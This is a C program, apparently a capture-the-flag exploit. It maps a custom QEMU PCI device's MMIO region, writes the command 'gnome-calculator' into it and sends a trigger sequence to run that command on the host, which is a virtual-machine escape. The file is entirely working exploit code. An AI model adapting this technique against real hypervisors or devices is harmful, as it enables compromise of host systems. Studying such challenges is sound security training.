#include <sys/io.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/types.h>

unsigned char* mmio_mem;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint64_t choice,uint64_t idx,uint64_t chr)
{
    uint64_t addr = ((choice & 0xf) << 20);
    uint64_t value = 0;
    addr += ((idx & 0xf) << 16);
    printf("the addr is 0x%lx\n",addr);
    if(choice == 6){
        //write command 
        value = chr;
        addr = idx;
        addr += (((choice & 0xf)) << 20);
    }
    *((uint64_t *)(mmio_mem+addr)) = value;
}

uint64_t mmio_read(uint64_t addr)
{
    return *((uint64_t*)(mmio_mem+addr));
}


int main()
{
// Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem @ %p\n", mmio_mem);

    //write command
    mmio_write(6,0,0x67);
    mmio_write(6,1,0x6e);
    mmio_write(6,2,0x6f);
    mmio_write(6,3,0x6d);
    mmio_write(6,4,0x65);
    mmio_write(6,5,0x2d);
    mmio_write(6,6,0x63);
    mmio_write(6,7,0x61);
    mmio_write(6,8,0x6c);
    mmio_write(6,9,0x63);
    mmio_write(6,10,0x75);
    mmio_write(6,11,0x6c);
    mmio_write(6,12,0x61);
    mmio_write(6,13,0x74);
    mmio_write(6,14,0x6f);
    mmio_write(6,15,0x72);
    //write to input
    //wwssadadBABA
    mmio_write(0,0,0);
    mmio_write(0,1,0);
    mmio_write(1,2,0);
    mmio_write(1,3,0);
    mmio_write(2,4,0);
    mmio_write(3,5,0);
    mmio_write(2,6,0);
    mmio_write(3,7,0);
    mmio_write(5,8,0);
    mmio_write(4,9,0);
    mmio_write(5,10,0);
    mmio_write(4,11,0);

    //
    mmio_read((1 << 20));

    return 0;
}

